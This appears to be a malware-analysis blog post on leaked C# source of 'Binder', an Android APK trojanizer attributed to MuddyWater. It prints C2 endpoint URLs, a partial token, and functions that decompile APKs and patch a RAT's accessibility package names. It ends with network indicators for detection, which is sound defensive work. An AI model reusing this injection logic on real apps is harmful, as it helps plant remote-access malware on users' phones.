Let’s start with the file\n```\nConnectionHandler.cs which is implementing the logic behind the Binder project.\n\n```\nAnalyzing the variable assignments at the beginning of the file we read the following code\n(snip)\n```\n[...]\nRedLogClass s = new RedLogClass();\n    private static string ip = \"http://192.168.20.87\";\n    private string getTaskUrl = ip + \"/api/get_sample\";\n    private string setStatusUrl = ip + \"/api/set_status\";\n    private string setStatusBindUrl = ip + \"/api/edit_bind\";\n    private string setPermRatUrl = ip + \"/api/add_rat_permission\";\n    private string setPermApkUrl = ip + \"/api/add_apk_permission\";\n    private string uploadUrl = ip + \"/api/add_file\";\n    private string downloadUrl = ip + \"/download/file/\";\n    private string ComparePermUrl = ip + \"/api/compare_perm\";\n    private string token =\n\"TNwTIJStt8RXaDAuzEzGKXcFhJQ0bMApq2PmProIa0GHcITvFzslMf8pWP5kdTBtEaQDaHAsq8lCNZRDmz1zK\n[...]\n\n```\nSnipped from ConnectionHandler.cs\n\nMany interesting strings are telling a lot about the project and the threat actor. First of all we\nhave more API calls. For example `get_status, get_sample, add_apk_permission are`\ntelling us that we might detect this implant by a simple network probe looking for such a calls.\n\n\n-----\n\nIn other words we might detect Project Binder if we see those API on our network without the\nneed to have a local engine. One more `token is precious to understand that more than a`\ndeveloper is using/developing the project. Indeed the token in `ConnectionHandler.cs is`\ndifferent to the one on `RedLogClass plus the listening IP addresses are belonging to the`\nsame subnet but not the same PC. Both of these information are suggesting we have more\nthan one developer on the project. Having the same private subnet `192.168.20.x would`\nprobably highlithg that developers are working in a common office or in the same building\nsharing the LAN, which take me into the idea that an organized group of people are working\non the project. On one hand having the same subnet it doesn’t actually mean that people are\non the same local area network, for example common private subnets such as\n```\n192.168.1.x, 10.10.10.x or 10.0.0.x are super common in many domestic\n\n```\ninfrastructures, however when subnets are not so common (like in this case:\n```\n192.168.20.x !”.20″!) finding the same subnet on two different systems (remember we do\n\n```\nhave different tokens and different listening IPs and same listening ports) is quite rare and it\nmight suggest more developers in the same local area network are working on it.\n\nBut let’s focus back on the source code. Now it’s ime to check another leaked file called\n```\nFunctions.cs . Here we might observe the internal Binder Functions. We are not talking\n\n```\nabout API calls but rather how internally Binder works to decompile and to inject malicious\npayloads into the original APK.\n\n\n-----\n\n```\n[...]\n public bool decompile(string rootPath, string id, string apkName)\n    {\n      string apkPath = rootPath + \"apks\\\\\" + id + \"\\\\\" + apkName + \".apk\";\n      string decompilePath = rootPath + \"apks\\\\\" + id + \"\\\\\" + apkName;\n      if (Directory.Exists((decompilePath)))\n      {\n        try\n        {\n          System.IO.Directory.Delete((decompilePath), true);\n        }\n        catch (Exception ex)\n        {\n          this.PostLog(\"Exception\", ex.Message);\n          System.IO.Directory.Move(decompilePath, decompilePath + \"_del\");\n        }\n      }\n      if (this.Execute(\"cmd.exe\", (\"/c java -jar \\\"\"\n              + (rootPath + \"tools\\\\\" + (\"apktool.jar\\\" d \\\"\\\" -f \\\"\"\n              + (apkPath + \"\\\" -o \\\"\\\"\" + decompilePath + \"\\\"\"))))))\n      {\n        this.PostLog(\"Information\", \"decompiling complete.\");\n        return true;\n      }\n      this.PostLog(\"Warning\", \"decompiling error.\");\n      return false;\n    }\n[...]\n\n```\nFunctions.cs snip\n\nAs you might appreciate from the previous code snip, Binder does not include internal native\nfunctionalities to decompile APK neither it uses external libraries included into the MVS\nproject. It launches simple command lines utilities such a apktool.jar. From here we might\ndeduce how the attacker machine should be configured. First of all, we have a Windows\nmachine. Infact we might see from the decompiling function the way they run apktool by\ncmd.exe, which is a native terminal tool in Microsoft Windows. APKTOOLS is a Java\nprogram so we may assume that the attacker (developer) machine needs to have Java\ninstalled and working in the native envirenment. So the attacker PC is a Windows BOX with\nOld version of Visual studio and two important tools: a JVM and apktools set. Controls on\ncode (by meaning input controlls) are quite light and it could be not such a difficult to inject a\ncommand codeon by alteranting the APK name including `; interrumpting the` `cmd.exe`\nexecution.\n\n\n-----\n\n```\n[...]\n public bool editPnameOfAccessibility(string ratPath, string targetPath)\n    {\n      string orgAppKey = \"net.ronixi.dada/\";\n      string FilePath1 = ratPath +\n\"\\\\smali\\\\net\\\\ronixi\\\\dada\\\\dialog\\\\Access.smali\";\n      string FilePath2 = ratPath +\n\"\\\\smali\\\\net\\\\ronixi\\\\dada\\\\plugins\\\\CheckAccessibilityClass.smali\";\n      string package = getPackage(targetPath + \"\\\\AndroidManifest.xml\");\n      if (package != \"NON\")\n      {\n        string allText1 = File.ReadAllText(FilePath1);\n        string output1 = allText1.Substring(0, allText1.IndexOf(orgAppKey)) +\npackage + \"/\" + allText1.Substring(allText1.IndexOf(orgAppKey) + orgAppKey.Length);\n        File.WriteAllText(FilePath1, output1);\n        string allText2 = File.ReadAllText(FilePath2);\n        string output2 = allText2.Substring(0, allText2.IndexOf(orgAppKey)) +\npackage + \"/\" + allText2.Substring(allText2.IndexOf(orgAppKey) + orgAppKey.Length);\n        File.WriteAllText(FilePath2, output2);\n        this.PostLog(\"Information\", \"Accessibility Packages of Rat Edited.\");\n        return true;\n      }\n      else\n      {\n        this.PostLog(\"Warning\", \"Accessibility Packages of Rat not Edited.\");\n        return false;\n      }\n    }\n[...]\n\n```\nOne more function in Functions.cs snip\n\nSuper interesting to note which are the Organization Path Name before prepare the\ninkection. It’s like the organization name `ronixi would be quite interesting to be monitored`\nor to perform research for this string ver the following months. It is quite interesting what you\n[can find on VT by searching for this string (HERE) – many wired and new payloads into PDF](https://www.virustotal.com/gui/search/ronixi/files)\nfiles. One more interesting action is coming from the following function ( editSDK ) in the\nsame leaked source code. The attacker changes the SDK version to 22…\n\n\n-----\n\n```\n[...]\n public void editSDK(string targetPath)\n    {\n      string orgAppKey = \"targetSdkVersion: '\";\n      string FilePath = targetPath + \"\\\\apktool.yml\";\n      string allText = File.ReadAllText(FilePath);\n      string output = allText.Substring(0, allText.IndexOf(orgAppKey) +\norgAppKey.Length) + \"22\" + allText.Substring(allText.IndexOf(orgAppKey) +\norgAppKey.Length + 2);\n      File.WriteAllText(FilePath, output);\n      this.PostLog(\"Information\", \"SDk version change to 22.\");\n    }\n[...]\n\n```\nOne more function in Functions.cs snip\n\nOne more sintax mistake on line 392 of Function.cs supporting the non English speaker\nhyphothesis – `this.PostLog(\"Information\", \"injecte code to lancher activity`\n```\ndone.\"); .\n\n```\n**Conclusions**\n\nThreat attribution process is always hard and for several reasons an error oriented process\n(just think to false flags). According to Lab Dookhtegan this source code is allegedly\nattributed to MuddyWater, if it’s is true, now we do know a little bit more about how do they\ndevelop and how do they “think code”, nevertheless we do have some network signatures\nthat could be used to detect Binder in network analyses. These are not strong IoC (this is\nwhy I didn’t add an IoC section) since many different applications could potentially use the\nsame API names but, if you consider an “union” of them (more single and different detections\nfrom the same source), we might endup if Binder is installed on your network or not.\nInteresting API to monitor: “/api/get_sample”; “/api/set_status”; “/api/edit_bind”;\n“/api/add_rat_permission”; “/api/add_apk_permission”;\n\n“/api/add_file”; “/download/file/”; “/api/compare_perm”; Have a nice weekend !\n\n\n-----",
